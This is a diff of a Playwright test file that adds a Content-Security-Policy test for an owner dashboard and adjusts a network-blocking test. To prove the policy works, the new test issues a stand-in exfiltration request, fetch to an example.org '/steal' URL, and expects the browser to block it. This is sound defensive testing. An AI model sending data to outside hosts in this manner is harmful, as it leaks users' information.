@@ -2,7 +2,7 @@
 // and the test data contains nothing real.
 const fs = require('fs');
 const path = require('path');
-const { test, expect, login } = require('../helpers/dashboard');
+const { test, expect, login, gotoPage } = require('../helpers/dashboard');
 const { SUPABASE_HOST } = require('../helpers/mock-supabase');
 
 const TESTS_DIR = path.resolve(__dirname, '..');
@@ -27,7 +27,10 @@ test('requests to the production Supabase address are answered by the mock', asy
 });
 
 test('any other internet address is blocked', async ({ page, backend }) => {
-  await page.goto('/owner-login.html');
+  // Proves the test mock's own blocking layer, so it runs on a page without a
+  // Content-Security-Policy (the dashboard's policy now refuses these even
+  // earlier, in the browser: see the CSP test below).
+  await page.goto('/change-password.html');
   const outcomes = await page.evaluate(async () => {
     const urls = ['https://example.com/', 'https://api.github.com/', 'https://admin.shopify.com/', 'https://gmail.googleapis.com/'];
     const out = [];
@@ -102,4 +105,23 @@ test('docs, SQL drafts and helpers contain no secrets or real e-mail addresses',
     for (const email of text.match(emailPattern) || []) if (!allowedEmail.test(email)) problems.push(`${rel} has e-mail ${email}`);
   }
   expect(problems).toEqual([]);
+});
+
+// F3-14 (EXT3): Content-Security-Policy on the owner dashboard.
+test('the dashboard has a Content-Security-Policy, shows no violations in normal use, and blocks other sites', async ({ page, backend }, testInfo) => {
+  test.skip(testInfo.project.name !== 'desktop', 'run once');
+  const violations = [];
+  await page.exposeFunction('__cspViolation', v => violations.push(v));
+  await page.addInitScript(() => document.addEventListener('securitypolicyviolation', e => window.__cspViolation(e.violatedDirective + ' ' + e.blockedURI)));
+  await login(page);
+  for (const id of ['ordersPanel', 'inventoryPanel', 'accountingPanel', 'documentsPanel', 'calendarPanel']) await gotoPage(page, id);
+  await page.waitForLoadState('networkidle');
+  expect(violations, 'normal use triggers no policy violation').toEqual([]);
+  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
+  expect(csp).toContain("connect-src 'self' https://uizrazyehilyzmwttsrn.supabase.co");
+  expect(csp).toContain("object-src 'none'");
+  // A request to any other site is refused by the browser itself.
+  const result = await page.evaluate(() => fetch('https://example.org/steal?x=1').then(() => 'sent', () => 'blocked'));
+  expect(result).toBe('blocked');
+  expect(violations.some(v => v.startsWith('connect-src') && v.includes('example.org'))).toBe(true);
 });
